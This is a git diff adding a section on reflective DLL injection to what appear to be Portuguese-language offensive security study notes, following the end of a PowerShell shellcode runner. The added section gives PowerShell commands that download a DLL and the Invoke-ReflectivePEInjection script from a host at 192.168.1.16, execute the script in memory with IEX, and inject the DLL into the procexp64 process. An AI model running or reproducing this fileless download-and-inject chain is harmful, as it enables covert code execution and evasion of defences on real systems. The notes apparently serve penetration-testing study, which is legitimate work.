@@ -154,3 +154,21 @@ $hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPoint
 	(getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
 
 ```
+
+# Injeção Reflexiva de DLL
+
+## Script utilizado
+
+[Invoke-ReflectivePEInjection.ps1](Programas/Invoke-ReflectivePEInjection.ps1)
+
+> Referência: https://github.com/charnim/Invoke-ReflectivePEInjection.ps1
+
+## Utilização
+
+* A DLL foi a mesma utilizada no resumo do C#
+
+```powershell
+$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.16:1235/chucrutis.dll')
+IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.16:1235/Invoke-ReflectivePEInjection.ps1'))
+Invoke-ReflectivePEInjection -PEBytes $bytes -ProcName procexp64
+```
